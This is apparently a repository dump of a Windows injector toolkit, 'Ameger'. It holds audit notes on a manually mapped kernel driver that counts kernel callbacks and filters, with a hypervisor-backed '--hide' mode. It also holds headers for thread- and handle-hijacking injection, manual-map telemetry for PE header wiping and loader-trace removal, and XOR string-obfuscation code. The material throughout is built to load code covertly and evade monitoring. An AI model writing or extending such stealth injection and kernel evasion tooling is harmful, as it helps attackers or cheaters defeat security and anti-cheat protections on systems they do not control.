- Correct three-argument typedef.
- Count-only call `enumerate(NULL, 0, &capacity)`, then one nonpaged allocation of
  `capacity * sizeof(PVOID)` (bounded at 4096 entries), then
  `enumerate(list, capacity, &returned)`, with one retry on `STATUS_BUFFER_TOO_SMALL`.
- Every returned filter handle owns a rundown reference. `FltObjectDereference` is resolved
  from the on-disk export table (RVA `0x14180` in `fltmgr.sys` 10.0.26100.9278) and called
  for each non-NULL entry. The walker is skipped if that export cannot be resolved, rather
  than leaking references.
- Both function pointers are span-validated against the caller's module table; the call is
  PASSIVE_LEVEL only.

**Compiled proof (final image `cgg1w4tXL6n.sys`).**
- `lea r8,[rsp+70h]; xor edx,edx; xor ecx,ecx; call rbx` â€” the count-only call.
- `mov edx,[rsp+70h]; lea r8,[rsp+78h]; mov rcx,rax; call rbx` â€” the real enumeration.
- `call rbp` inside the returned-handle loop â€” the deref.
- `call qword ptr [0x180004008]` (`IoDeleteDriver`) followed by
  `PsTerminateSystemThread` in the teardown worker.
- Import allowlist remains `ntoskrnl.exe` only.

## K2. Other defects found in the same audit (fixed)

1. **Notify symbols were wrong.** The tool asked dbghelp for
   `PspProcessNotifyRoutine` / `PspThreadNotifyRoutine`; the 26300 PDB has no such
   symbols. kd reports `PspCreateProcessNotifyRoutine`,
   `PspCreateProcessNotifyRoutineCount`, `PspCreateThreadNotifyRoutine`,
   `PspCreateThreadNotifyRoutineCount`, and `PspLoadImageNotifyRoutine[Count]`.
   ProcessNotify and ThreadNotify were therefore always reported as skipped.
2. **Stale slots were counted.** `AmegerWalkNotifyArray` scanned all 64 array slots
   regardless of `Count`. Unregistered callbacks leave non-zero slots, so the
   `2026-10-25 --census=notify` "ImageNotify 2 registered, 2 foreign" was not a
   registration count. It now scans only the first `Count` entries (clamped to 64).
3. **Module spans were guessed.** `EnumDeviceDrivers` gives bases but not sizes; the
   old next-base/64 MB derivation mislabels callbacks inside `nvlddmkm` (141 MB) and
   `amdkmdag` (102 MB) as foreign and can accept unbacked VA gaps. KernelCtl now reads
   each loaded driver's `SizeOfImage` from its own PE header on disk, falling back to
   the next-base span only when the file cannot be read.
4. **Teardown left residue.** It deleted the symlink and device but not the driver object
   or the two name buffers, so a same-build re-map failed with
   `STATUS_OBJECT_NAME_COLLISION`. It now frees both pools and calls `IoDeleteDriver` on
   the object `IoCreateDriver` created.
5. **Create.bat could not build on a path with spaces.** `%MSBUILD%` was unquoted; the
   VS 18 install at `C:\Program Files (x86)\...` failed with `'C:\Program' is not
   recognized`. Both invocations are quoted.
6. **ABI bump.** The census request grew the `FltObjectDereference` address, so
   `AMEGER_KERNEL_ABI_VERSION` is now `20261026`. A stale driver/tool pair is rejected by
   the query IOCTL before any census runs.
7. **Dispatch-table spot check was too narrow.** The five 0x50 dumps in the same corpus
   are `IofCallDriver+0x84` dispatching through a non-code IP while `KernelCtl.exe` opened
   the device (the faulting IP equals the fault address). The init read-back compared only
   `IRP_MJ_CREATE`; it now compares CREATE, CLOSE and DEVICE_CONTROL and deletes the device
   on any mismatch, so a table that does not hold this driver's handlers can never become
   resident.

## K3. Baseline: post-fix measurement (2026-10-25, operator-run, elevated)

The invalid pre-fix readings above came from the broken build. The first post-fix
elevated run used build `yt0KnNTI.sys` (seed `0xAE2EB449`, device `\\.\AJbo0PBpTw`,
SHA-256 `c704f02106be9a1f786164fad89b379539dde56d8aa78b227d3f3ea586916d9c`).
Confirmed readings:

| Walker | Confirmed reading |
|---|---|
| ProcessNotify | **5 registered, 0 foreign**, declared Count = 5 |
| ThreadNotify | **2 registered, 0 foreign**, declared Count = 2 |
| ImageNotify | **2 registered, 0 foreign** |
| ObCallbacks(Process) | **1 entry, 1 foreign pre-operations** |
| ObCallbacks(Thread) | **1 entry, 1 foreign pre-operations** |
| Minifilters | **12 registered**, Enumerate Status = `0x00000000` |

- The notify counts equal their `PspCreate*NotifyRoutineCount` values â€” the expected
  shape on this host.
- **Open finding:** both Ob walkers report one registered entry whose pre-operation body
  falls outside every loaded module's PE-exact span; the tool flags "The Kernel Baseline
  Is Not Stock." The body's nature is not yet attributed (third-party registration vs
  misattribution) â€” unconfirmed in this corpus.
- **Mapper `--hide` gate failed:** the run printed `No hypervisor present; nothing to
  hide`, so `hide_ok = false` and the mapper exited `-1` (`Main.cpp:1043`). The image
  stayed resident (the mapper's `--free`/force-free path was not triggered), which is why
  the KernelCtl runs succeeded. The hypervisor is loaded by the mapper itself â€” map
  `Hypervisor.sys` first (its `Entry` runs `SVM::VirtualizeAllProcessors` and exposes the
  vmmcall interface), then re-run the Ameger driver with `--hide`.
- The zero-residue same-build re-map after `KernelCtl.exe --teardown` (no
  `STATUS_OBJECT_NAME_COLLISION`) has not yet been run.

## K4. Verification status

Performed:
- `Create.bat` exit 0; gates: Native subsystem, x64, `ntoskrnl.exe`-only imports,
  non-standard section names, no plaintext device/symbol names.
- Static disassembly of the final image for the three-argument call, the deref loop, the
  three-slot dispatch read-back, and `IoDeleteDriver`.
- Export-table confirmation of `FltEnumerateFilters` (RVA `0x7A110`) and
  `FltObjectDereference` (RVA `0x14180`).
- PDB confirmation of the `PspCreate*NotifyRoutine` symbol names on 26300.
- Dump audit of every unique crash in the corpus: 5 x `0x50`
  (`IofCallDriver+0x84` through a bad dispatch slot; pre-fix device-object path),
  2 x `0x1E` (`FLTMGR!FltEnumerateFilters+0x144`; K1), 1 x `0x7E`
  `C0000096` in `HalpWheaNativeReadMsr` on a `System` thread. The 0x7E is not
  `KernelCtl.exe` and is outside this driver; it belongs to the earlier hypervisor/WHEA
  surface (the Hypervisor repo's non-whitelisted-MSR emulation change targets that
  class).

Live map + census: performed by the operator 2026-10-25 (elevated), build `yt0KnNTI.sys`:
mapper exit was not 0 â€” `--hide` reported `No hypervisor present` (`hide_ok=false`,
`Main.cpp:1043`); KernelCtl QUERY + full census passed; teardown accepted. Remaining
gates: (a) start `Hypervisor` and re-run the mapper so the mapper exits 0; (b) re-map the
same build after teardown to prove zero residue; (c) attribute the two foreign Ob pre-op
bodies.

```

### .asm-lsp.toml â€” 18 lines â€” sha12:BE3B50C08A8C
```toml
[default_config]
assembler = "masm"
instruction_set = "x86/x86-64"

[default_config.opts]
compiler = "powershell.exe"
compile_flags_txt = [
    "-NoProfile",
    "-ExecutionPolicy",
    "Bypass",
    "-File",
    "D:\\Ameger\\AssemblyCheck.ps1",
    "/Zs",
    "/nologo",
    "/ID:\\Ameger\\Injector\\Ameger\\Execution\\Stub",
    "/DAMEGER_STUB_SEED=0"
]
diagnostics = true
default_diagnostics = true

```

### .clangd â€” 64 lines â€” sha12:3F3939A49E24
```json
Diagnostics:
  UnusedIncludes: None
  Suppress:
    # EXPORT_FUNCTION expands to __pragma(comment(linker, "/EXPORT:name=__FUNCDNAME__")).
    # MSVC expands the builtin inside __pragma; clang does not, so it diagnoses every
    # export site as a malformed pragma. The builds emit the aliases correctly.
    - pragma_comment_malformed

# Include roots.
#
# "Ameger/" is the include root for every internal header (Core/..., NT/..., System/...,
# Execution/..., Injection/...), and the repository root is needed so that "../../../Injection.h"
# resolves from Ameger/Core/Utility/Header.
#
# The launcher project has its own roots, and they are the ones its precompiled header
# needs: "Interface/Source" for "Launcher.h" and "Interface/Source/PCH" for "PCH.h".
#
# clangd resolves a relative -I against its own working directory, which is not guaranteed to be the
# repository root or its parent, so the absolute forms are listed first and are what actually resolves.
# The relative forms are kept afterwards purely as a fallback for a checkout at a different path:
# clangd treats a -I that names a directory which does not exist as "no such root" rather than as an
# error, so the unused entries are harmless.
CompileFlags:
  Add:
    - -std=c++20
    - -target
    - x86_64-pc-windows-msvc
    - -fms-compatibility
    - -fdelayed-template-parsing
    - -fexceptions
    - -Wno-microsoft-cast
    - -Wno-microsoft-enum-value
    - -Wno-microsoft-exception-spec
    - -Wno-msvc-include
    - -Wno-delayed-template-parsing-in-cxx20
    - -DWIN32
    - -D_WIN64
    - -D_WINDOWS
    - -DUNICODE
    - -D_UNICODE
    - -DNTDDI_VERSION=0x0A00000C
    - -D_WIN32_WINNT=0x0A00
    - -DNOMINMAX
    # The runtime's SHA-256 pin is a per-build value that the build injects as
    # eight 32-bit words. They are defined here as the project default of zero
    # so the file parses; the launcher refuses to run a runtime whose pin is
    # all zeroes, so this cannot be mistaken for a real pin.
    - -DAMEGER_RUNTIME_DLL_HASH0=0
    - -DAMEGER_RUNTIME_DLL_HASH1=0
    - -DAMEGER_RUNTIME_DLL_HASH2=0
    - -DAMEGER_RUNTIME_DLL_HASH3=0
    - -DAMEGER_RUNTIME_DLL_HASH4=0
    - -DAMEGER_RUNTIME_DLL_HASH5=0
    - -DAMEGER_RUNTIME_DLL_HASH6=0
    - -DAMEGER_RUNTIME_DLL_HASH7=0
    - -ID:/Ameger/Injector/Ameger
    - -ID:/Ameger/Injector
    - -ID:/Ameger/Injector/Interface/Source
    - -ID:/Ameger/Injector/Interface/Source/PCH
    - -IAmeger
    - -I.
    - -IInjector/Ameger
    - -IInjector
    - -IInterface/Source
    - -IInterface/Source/PCH

```

### .gitignore â€” 10 lines â€” sha12:C0C709F0B1FE
```gitignore
Build/Release/
Build/obj/
Driver/Build/Release/
Driver/Build/obj/

.symbols/

nul
NUL

.zed/settings.json.local

*.proxy.log

.orchestrator
```

### .zed/settings.json â€” 17 lines â€” sha12:6DD2654451A1
```json
{
  "file_types": {
    "Assembly": ["inc", "asm", "s", "S"]
  },
  "languages": {
    "Assembly": {
      "language_servers": ["asm-lsp"]
    }
  },
  "lsp": {
    "asm-lsp": {
      "binary": {
        "path": "C:\\Users\\Master\\.cargo\\bin\\asm-lsp.exe"
      }
    }
  }
}

```

### Ameger/Core/Foundation/Error.h â€” 118 lines â€” sha12:7D0753895C9F
```c-header
#pragma once

#include <Windows.h>
#ifndef MAX_PATH
#define MAX_PATH 260
#endif

#define INJ_ERR_SUCCESS					0x00000000

#define INJ_ERR_ADVANCED_NOT_DEFINED	0xFFFFFFFF

#define INJ_ERR_NO_DATA						0x00000001
#define INJ_ERR_INVALID_PID					0x00000006
#define INJ_ERR_CANT_OPEN_PROCESS			0x00000007
#define INJ_ERR_INVALID_PROC_HANDLE			0x00000008
#define INJ_ERR_CANT_GET_EXE_FILENAME		0x00000009
#define INJ_ERR_PLATFORM_MISMATCH			0x0000000A
#define INJ_ERR_CANT_GET_TEMP_DIR			0x0000000B
#define INJ_ERR_WPM_FAIL					0x00000010
#define INJ_ERR_GET_MODULE_HANDLE_FAIL		0x00000012
#define INJ_ERR_OUT_OF_MEMORY_EXT			0x00000015
#define INJ_ERR_OUT_OF_MEMORY_NEW			0x00000017
#define INJ_ERR_GET_SYMBOL_ADDRESS_FAILED	0x00000019
#define INJ_ERR_GET_PROC_ADDRESS_FAIL		0x0000001A
#define INJ_ERR_VERIFY_RESULT_FAIL			0x0000001B
#define INJ_ERR_SYMBOL_INIT_NOT_DONE		0x0000001C
#define INJ_ERR_SYSCALL_RESOLVE_FAILED		0x0000001D
#define INJ_ERR_SYSCALL_STUB_BUILD_FAILED	0x0000001E
#define INJ_ERR_CANT_GET_MODULE_PATH		0x0000001F
#define INJ_ERR_FAILED_TO_LOAD_DLL			0x00000020
#define INJ_ERR_SYMBOL_LOAD_FAIL			0x00000021
#define INJ_ERR_UPDATE_PROTECTION_FAILED	0x0000002E
#define INJ_ERR_NOT_IMPLEMENTED				0x00000033
#define INJ_ERR_KERNEL32_MISSING			0x00000034
#define INJ_ERR_IMPORT_HANDLER_NOT_DONE		0x00000037
#define INJ_ERR_WINDOWS_VERSION				0x00000040
#define INJ_ERR_ALREADY_RUNNING				0x00000042
#define INJ_ERR_IMPORT_INTERRUPT			0x00000043
#define INJ_ERR_INTERRUPT					0x00000045
#define INJ_ERR_SYMBOL_PARSE_FAIL			0x00000046
#define INJ_ERR_INVALID_EXE_PATH			0x00000048
#define INJ_ERR_NO_RAW_DATA					0x0000004A
#define INJ_ERR_UNHANDLED_EXCEPTION			0x0000004D
#define INJ_ERR_WINDOWS_BUILD_UNSUPPORTED	0x0000004E
#define INJ_ERR_HANDLE_HIJACK_FAILED		0x0000004F

#define INJ_ERR_NO_LAST_ERROR				0x00000050

// The target's ntdll is mapped at a different base than the local one, so the
// loader internals resolved against the local image cannot be used remotely.
#define INJ_ERR_NTDLL_LAYOUT_MISMATCH		0x00000051

#define INJ_MM_ERR_NO_DATA						0x00400001
#define INJ_MM_ERR_HEAP_ALLOC					0x00400003
#define INJ_MM_ERR_UPDATE_PAGE_PROTECTION		0x00400006
#define INJ_MM_ERR_MEMORY_ALLOCATION_FAILED		0x00400008
#define INJ_MM_ERR_IMAGE_CANT_BE_RELOCATED		0x00400009
#define INJ_MM_ERR_IMPORT_FAIL					0x0040000A
#define INJ_MM_ERR_DELAY_IMPORT_FAIL			0x0040000B
#define INJ_MM_ERR_ENABLING_SEH_FAILED			0x0040000C
#define INJ_MM_ERR_INVALID_HEAP_HANDLE			0x0040000E
#define INJ_MM_ERR_INVALID_PE_IMAGE				0x00400011
#define INJ_MM_ERR_LOADER_LOCK_FAILED			0x00400012
#define INJ_MM_ERR_DLLMAIN_FAILED				0x00400013
#define INJ_MM_ERR_TLS_CALLBACK_RANGE			0x00400014

#define SR_ERR_SUCCESS					0x00000000

#define SR_ERR_INVALID_LAUNCH_METHOD	0x10000002
#define SR_ERR_INTERRUPT				0x10000004
#define SR_ERR_TARGET_EXITED			0x10000005

#define SR_HT_ERR_PROC_INFO_FAIL			0x10200001
#define SR_HT_ERR_NO_THREADS				0x10200002
#define SR_HT_ERR_OPEN_THREAD_FAIL			0x10200003
#define SR_HT_ERR_SUSPEND_FAIL				0x10200004
#define SR_HT_ERR_GET_CONTEXT_FAIL			0x10200005
#define SR_HT_ERR_CANT_ALLOC_MEM			0x10200006
#define SR_HT_ERR_WPM_FAIL					0x10200007
#define SR_HT_ERR_SET_CONTEXT_FAIL			0x10200008
#define SR_HT_ERR_RESUME_FAIL				0x10200009
#define SR_HT_ERR_REMOTE_PENDING_TIMEOUT	0x1020000B
#define SR_HT_ERR_RPM_FAIL					0x1020000C
#define SR_HT_ERR_RECOVERY_REQUIRED			0x1020000D
#define SR_HT_ERR_OPEN_REFUSED				0x1020000E
#define SR_HT_ERR_STUB_PATCH_FAIL			0x1020000F
#define SR_HT_ERR_SHELL_PIVOT_INVALID		0x10200010

#define FILE_ERR_SUCCESS					0x00000000

#define FILE_ERR_INVALID_FILE_SIZE			0x20000002
#define FILE_ERR_INVALID_FILE				0x20000003
#define FILE_ERR_INVALID_PE_LAYOUT			0x20000005
#define FILE_ERR_RELOCATIONS_REQUIRED		0x20000006

#define SYMBOL_ERR_SUCCESS						0x00000000

#define SYMBOL_ERR_CANT_OPEN_MODULE				0x40000001
#define SYMBOL_ERR_FILE_SIZE_IS_NULL			0x40000002
#define SYMBOL_ERR_CANT_ALLOC_MEMORY_NEW		0x40000003
#define SYMBOL_ERR_INVALID_FILE_ARCHITECTURE	0x40000004
#define SYMBOL_ERR_CANT_ALLOC_MEMORY			0x40000005
#define SYMBOL_ERR_NO_PDB_DEBUG_DATA			0x40000006
#define SYMBOL_ERR_PATH_DOESNT_EXIST			0x40000007
#define SYMBOL_ERR_CANT_CREATE_DIRECTORY		0x40000008
#define SYMBOL_ERR_DOWNLOAD_FAILED				0x4000000A
#define SYMBOL_ERR_CANT_ACCESS_PDB_FILE			0x4000000B
#define SYMBOL_ERR_CANT_OPEN_PDB_FILE			0x4000000C
#define SYMBOL_ERR_CANT_OPEN_PROCESS			0x4000000D
#define SYMBOL_ERR_SYM_INIT_FAIL				0x4000000E
#define SYMBOL_ERR_SYM_LOAD_TABLE				0x4000000F
#define SYMBOL_ERR_NOT_INITIALIZED				0x40000011
#define SYMBOL_ERR_INVALID_SYMBOL_NAME			0x40000012
#define SYMBOL_ERR_SYMBOL_SEARCH_FAILED			0x40000013
#define SYMBOL_ERR_INTERRUPT					0x40000016
#define SYMBOL_ERR_OBJECT_IS_NULL				0x40000018
#define SYMBOL_ERR_OBJECT_NOT_READY				0x40000019
#define SYMBOL_ERR_CANT_CONVERT_PDB_GUID		0x4000001A

struct ERROR_DATA
{
	DWORD		AdvErrorCode = INJ_ERR_ADVANCED_NOT_DEFINED;
	int			Line = 0;
};

inline DWORD NormalizeAdvError(DWORD AdvErrorCode)
{
	return AdvErrorCode == INJ_ERR_ADVANCED_NOT_DEFINED ? INJ_ERR_SUCCESS : AdvErrorCode;
}

#define INIT_ERROR_DATA(data, error) \
do { \
	(data).AdvErrorCode = (error); \
	(data).Line = __LINE__; \
} while (0)
```

### Ameger/Core/Foundation/Primitives/InjectionTypes.h â€” 200 lines â€” sha12:9D55695D5260
```c-header
#pragma once

#include <Windows.h>

#define INJ_HANDLE_HIJACKING			0x0040

inline constexpr DWORD INJ_THREAD_HIJACK_ACCESS =
	THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
	THREAD_QUERY_LIMITED_INFORMATION |
	SYNCHRONIZE;

enum class HijackSource : DWORD
{
	Direct = 0,
	Scan = 1,
	Sponsor = 2
};

struct HijackStats
{

	DWORD Attempted = 0;
	DWORD Success = 0;
	DWORD Source = static_cast<DWORD>(HijackSource::Direct);
	DWORD FailCode = 0;

	DWORD DonorPid = 0;
	DWORD DonorHandle = 0;
	DWORD NewHandle = 0;
	DWORD GrantedAccess = 0;

	DWORD TotalHandles = 0;
	DWORD Examined = 0;
	DWORD DupDenied = 0;
	DWORD VerifyRejected = 0;
	DWORD OwnersOpened = 0;
	DWORD Calibrated = 0;
	DWORD SnapStatus = 0;
	DWORD BudgetSkipped = 0;

	DWORD SnapshotBytes = 0;
	DWORD ProbeMethod = 0;
};

static_assert(sizeof(HijackStats) == 72);
static_assert(offsetof(HijackStats, Attempted) == 0);

struct THREAD_EXEC_STATS
{
	DWORD Attempted = 0;
	DWORD Success = 0;
	DWORD HijackedTid = 0;
	DWORD FailCode = 0;
	DWORD DonorRounds = 0;
	DWORD64 RoutineCyclesDelta = 0;
	// A5: the RSP the stub pivoted to, and the window that RSP must fall in.
	// A zero ShellStackTop means the pivot was not observed, which is a failed
	// isolation check rather than a cosmetic one.
	ULONG_PTR ShellStackTop = 0;
	DWORD PollIterations = 0;
	DWORD ExecMs = 0;
	DWORD RoutineRet = 0;
	ULONG_PTR OldRip = 0;
	ULONG_PTR OldRsp = 0;
	ULONG_PTR ShellStackBase = 0;
	DWORD FpMode = 0;
	DWORD FpMask = 0;
	DWORD ShellStackSize = 0;
	// The register spill below the victim RSP holds only the victim's own
	// register values; no shell pointer or frame is ever placed there.
	DWORD VictimStackBytes = 0;

	// Host-side observation counter: incremented once per polling iteration in
	// which the stub was observed executing with its RSP inside the dedicated
	// shell stack.  Replaces the ShellStackSize "install flag" as the primary
	// evidence that the thread actually resumed on the shell stack — a zero
	// here means the pivot was never independently observed, even if the
	// staging allocation succeeded.
	DWORD ShellStackResumeCount = 0;
};

static_assert(sizeof(THREAD_EXEC_STATS) == 104);
static_assert(offsetof(THREAD_EXEC_STATS, Attempted) == 0);
static_assert(offsetof(THREAD_EXEC_STATS, DonorRounds) == 16);
static_assert(offsetof(THREAD_EXEC_STATS, PollIterations) == 40);
static_assert(offsetof(THREAD_EXEC_STATS, RoutineRet) == 48);
static_assert(offsetof(THREAD_EXEC_STATS, OldRip) == 56);
static_assert(offsetof(THREAD_EXEC_STATS, OldRsp) == 64);
static_assert(offsetof(THREAD_EXEC_STATS, ShellStackBase) == 72);
static_assert(offsetof(THREAD_EXEC_STATS, FpMode) == 80);
static_assert(offsetof(THREAD_EXEC_STATS, FpMask) == 84);
static_assert(offsetof(THREAD_EXEC_STATS, ShellStackSize) == 88);
static_assert(offsetof(THREAD_EXEC_STATS, VictimStackBytes) == 92);
static_assert(offsetof(THREAD_EXEC_STATS, ShellStackResumeCount) == 96);

struct MAP_STATS
{
	DWORD CleanedMask = 0;
	DWORD ImportSize = 0;
	DWORD DelayImportSize = 0;
	DWORD DebugSize = 0;
	DWORD RelocSize = 0;
	DWORD TlsSize = 0;
	DWORD ExportSize = 0;
	DWORD Verified = 0;
	DWORD ResidualMask = 0;
	// Header cloaking telemetry: how much of the header was structurally
	// present, how much was actually wiped, the protection it was left with,
	// and how many PE signatures were still found afterwards.
	DWORD HeaderStructuralSize = 0;
	DWORD HeaderWipeSize = 0;
	DWORD HeaderWipeProtect = 0;
	DWORD HeaderScanBytes = 0;
	DWORD HeaderScanMZ = 0;
	DWORD HeaderScanPE = 0;
	// 1 when the residual check read the mapper's cached directory copy rather
	// than the in-image header (INJ_ERASE_HEADER wipes the header first). The
	// check then proves cache consistency only, not an independent re-read.
	DWORD VerifiedCachedCopy = 0;
	// An allocation that had to be kept alive because something in the target
	// still points into the mapped image.
	ULONG_PTR RetainedAllocBase = 0;
	DWORD RetainedAllocSize = 0;
};

static_assert(sizeof(MAP_STATS) == 80);

struct STRING_STATS
{
	DWORD SymbolsDeclared = 0;
	DWORD SymbolsResolved = 0;
	DWORD HookNamesBuilt = 0;
	DWORD TiersTotal = 0;
	DWORD TiersPassed = 0;
	DWORD Reported = 0;
};

static_assert(sizeof(STRING_STATS) == 24);

#define AMEGER_NTSTATUS_UNSUCCESSFUL	((NTSTATUS)0xC0000001L)

// The telemetry block is published to the host a word at a time, so that a
// reader never sees a half-written value. A word-wise copy also copies the
// padding bytes of the structure, and padding has no defined value, so the
// structure is laid out with no padding at all: every byte of it belongs to a
// named field. The reserved field is what makes the four-byte group an even
// number of words, which is what leaves no gap at the end.
struct VERIFIABLE_EXEC_TELEMETRY
{
	ULONG_PTR LoaderLockCookie = 0;
	unsigned __int64 DllMainCyclesDelta = 0;
	PVOID TlsLastExecutedAddress = nullptr;
	PVOID InvertedTableEntryBase = nullptr;
	SIZE_T PreSectionSpanWiped = 0;
	// A6: the image is mapped by the host before the hijack, so the victim
	// thread never executes the map/relocate/cookie work. HostMapCycles is the
	// host's own TSC for that work; the remaining counters are written by the
	// shell around the stages it still owns, so the launcher can show exactly
	// where the in-shell window went.
	unsigned __int64 HostMapCycles = 0;
	unsigned __int64 ImportStageCycles = 0;
	unsigned __int64 DelayImportStageCycles = 0;
	unsigned __int64 ExceptionStageCycles = 0;
	unsigned __int64 TlsStageCycles = 0;
	unsigned __int64 TlsCallbackStageCycles = 0;
	unsigned __int64 HeaderStageCycles = 0;
	unsigned __int64 DirectoryStageCycles = 0;
	unsigned __int64 ProtectStageCycles = 0;

	NTSTATUS LdrLockStatus = AMEGER_NTSTATUS_UNSUCCESSFUL;
	NTSTATUS LdrUnlockStatus = AMEGER_NTSTATUS_UNSUCCESSFUL;
	ULONG LoaderLockState = 0;
	BOOL DllMainResult = FALSE;
	DWORD DllMainLastWin32Error = 0;
	DWORD TlsCallbacksConfigured = 0;
	DWORD TlsCallbacksExecuted = 0;
	DWORD TlsCallbacksFailed = 0;
	BOOL InvertedTableInstalled = FALSE;
	BOOL DynamicTableInstalled = FALSE;
	DWORD MZRemnantsFound = 0;
	DWORD PERemnantsFound = 0;
	DWORD PostWipeProtection = 0;
	// 1 when the loader-allocated TLS entry was found and unlinked from
	// LdrpTlsList, 0 when it was not (or TLS was not configured).
	DWORD TlsLoaderEntryUnlinked = 0;
	// L2: 1 when no loader entry existed to rewind (a valid outcome), so
	// telemetry consumers can distinguish "nothing to do" from "failed".
	DWORD TlsLoaderEntryAbsent = 0;
	// Reserved to keep the trailing four-byte group an even number of words.
	DWORD Reserved = 0;
	// A1: the TLS index the loader assigned, whether the image carries real TLS
	// data (which forces the registration to be retained), and whether each
	// piece of the registration was restored. The index in the image and the
	// PEB bitmap bit are separate facts, so each gets its own flag.
	DWORD TlsIndex = 0;
	DWORD TlsHasData = 0;
	DWORD TlsIndexRestored = 0;
	DWORD TlsBitmapBitCleared = 0;
	DWORD TlsSlotCleared = 0;
	NTSTATUS TlsLockStatus = AMEGER_NTSTATUS_UNSUCCESSFUL;
	NTSTATUS TlsUnlockStatus = AMEGER_NTSTATUS_UNSUCCESSFUL;
	// A6: the shell signals a host-owned event as its last act, so the launcher
	// can stop polling the state page the moment the work is done instead of
	// waiting for the next poll tick. The handle is closed by the shell.
	DWORD CompletionEventSignaled = 0;
	NTSTATUS CompletionEventStatus = AMEGER_NTSTATUS_UNSUCCESSFUL;
	// A3: packed debug-print protection state. Bit 0x10 = the first-chance
	// VEH guard is installed (the net for debug-print exceptions raised by
	// freshly loaded dependencies on the synthetic stack - without it the
	// target exits with DBG_PRINTEXCEPTION_C, measured 2026-10-25). The low
	// nibble counts the OutputDebugStringA/W imports (ordinary and
	// delay-load) redirected to a bare return in ntdll, so the payload's own
	// logging never raises the exception at all and never reaches the
	// target's VEH chain.
	DWORD DebugPrintVehInstalled = 0;
};

static_assert(sizeof(VERIFIABLE_EXEC_TELEMETRY) == 14 * sizeof(ULONG_PTR) + 26 * sizeof(DWORD),
	"the telemetry block must have no padding, because it is published a word at a time");
static_assert(sizeof(VERIFIABLE_EXEC_TELEMETRY) % sizeof(LONG) == 0,
	"the telemetry block is published a word at a time, so its size must be a whole number of words");

```

### Ameger/Core/Foundation/Primitives/KcStrings/Core/DomainKey.h â€” 23 lines â€” sha12:EB98AB8418C1
```c-header
#pragma once

#include <cstddef>
#include <cstdint>
#include <intrin.h>

namespace kc_strings
{
namespace detail
{

#ifndef AMEGER_STRING_SEED
#define AMEGER_STRING_SEED (__LINE__ * 0x5A827999u + 0x6ED9EBA1u)
#endif
inline constexpr std::uint32_t kStringSeed = static_cast<std::uint32_t>(AMEGER_STRING_SEED);

template <typename CharT, std::size_t N>
__forceinline void Wipe(CharT * p) noexcept
{
    volatile CharT * v = p;
    for (std::size_t i = 0; i < N; ++i)
    {
        v[i] = static_cast<CharT>(0);
    }
}
}
}

```

### Ameger/Core/Foundation/Primitives/KcStrings/Core/KcStrSuite.h â€” 68 lines â€” sha12:0696274DDD07
```c-header
#pragma once

#include <cstddef>
#include <cstdint>
#include <cstring>
#include <utility>

#include "../KcNarrow.h"
#include "../KcWide.h"
#include "../KcStack.h"
#include "../KcLayered.h"

namespace kc_strings
{

inline constexpr unsigned KcTierCount = 5;

__forceinline constexpr unsigned KcTiersPassed(unsigned self_test_result) noexcept
{
	return self_test_result == 0 ? KcTierCount : self_test_result - 1;
}

inline unsigned KcStringsSelfTest() noexcept
{
	{
		auto probe = KC_STR("Kc");
		const char * text = probe.c_str();
		if (text[0] != 'K' || text[1] != 'c' || text[2] != 0)
		{
			return 1;
		}
	}

	{
		auto probe = KC_WSTR(L"Kc");
		const wchar_t * text = probe.c_str();
		if (text[0] != L'K' || text[1] != L'c' || text[2] != 0)
		{
			return 2;
		}
	}

	{

		char buf[3];
		const char ref[3] = { 'K', 'c', 0 };
		constexpr auto stack_key = KC_STACK_KEY_;
		KC_SC_3(buf, stack_key, 'K', 'c', '\0');
		if (std::memcmp(buf, ref, sizeof(buf)) != 0)
		{
			return 3;
		}
		volatile char * wipe = buf;
		for (std::size_t i = 0; i < sizeof(buf); ++i)
		{
			wipe[i] = 0;
		}
	}

	{
		auto probe = KC_STR_LAYERED("Kc9");
		const char * text = probe.c_str();
		if (text[0] != 'K' || text[1] != 'c' || text[2] != '9' || text[3] != 0)
		{
			return 4;
		}
	}

	{
		auto probe = KC_WSTR_LAYERED(L"Kc9");
		const wchar_t * text = probe.c_str();
		if (text[0] != L'K' || text[1] != L'c' || text[2] != L'9' || text[3] != 0)
		{
			return 5;
		}
	}

	return 0;
}
}

```

### Ameger/Core/Foundation/Primitives/KcStrings/Core/XorString.h â€” 69 lines â€” sha12:B9CB997A1547
```c-header
#pragma once

#include <cstddef>
#include <utility>

#include "DomainKey.h"

namespace xor_string
{

	constexpr unsigned kGolden = 0x9E3779B1u;

	constexpr unsigned kBaseKey = 0xA53A5A5Du ^ static_cast<unsigned>(::kc_strings::detail::kStringSeed);

	template <typename CharT, size_t N, unsigned Key>
	struct XorEncrypted
	{
		static_assert(N > 1, "Empty string");

		CharT Data[N]{};

		static constexpr CharT EncryptByte(CharT c, std::size_t idx) noexcept
		{
			const unsigned ks = Key + static_cast<unsigned>(idx) * kGolden;
			return static_cast<CharT>(c ^ static_cast<CharT>(ks));
		}

		template <size_t... Is>
		constexpr XorEncrypted(const CharT(&s)[N], std::index_sequence<Is...>) noexcept
			: Data{ EncryptByte(s[Is], Is)... }
		{
		}
	};

	template <typename CharT, size_t N, unsigned Key>
	class XorDecrypted
	{
		CharT Buf[N];

		XorDecrypted(const XorDecrypted &) = delete;
		XorDecrypted & operator=(const XorDecrypted &) = delete;

	public:
		__declspec(noinline) explicit XorDecrypted(const XorEncrypted<CharT, N, Key> & enc) noexcept
		{
			for (size_t i = 0; i < N; ++i)
			{
				const unsigned ks = Key + static_cast<unsigned>(i) * kGolden;
				Buf[i] = static_cast<CharT>(enc.Data[i] ^ static_cast<CharT>(ks));
			}
		}

		~XorDecrypted() noexcept
		{
			volatile CharT * p = Buf;
			for (size_t i = 0; i < N; ++i)
			{
				p[i] = static_cast<CharT>(0);
			}
		}

		__forceinline const CharT * get() const noexcept
		{
			return Buf;
		}
	};
}

#define XOR_STR_A_IMPL(s, c)                                                                                          \
	::xor_string::XorDecrypted<char, (sizeof(s) / sizeof((s)[0])), (::xor_string::kBaseKey ^ (static_cast<unsigned>(c) * ::xor_string::kGolden))>( \
		[]() -> const ::xor_string::XorEncrypted<char, (sizeof(s) / sizeof((s)[0])), (::xor_string::kBaseKey ^ (static_cast<unsigned>(c) * ::xor_string::kGolden))> & { \
			static constexpr ::xor_string::XorEncrypted<char, (sizeof(s) / sizeof((s)[0])), (::xor_string::kBaseKey ^ (static_cast<unsigned>(c) * ::xor_string::kGolden))> kc_enc( \
				s, std::make_index_sequence<(sizeof(s) / sizeof((s)[0]))> {});                                              \
			return kc_enc;                                                                                             \
		}())
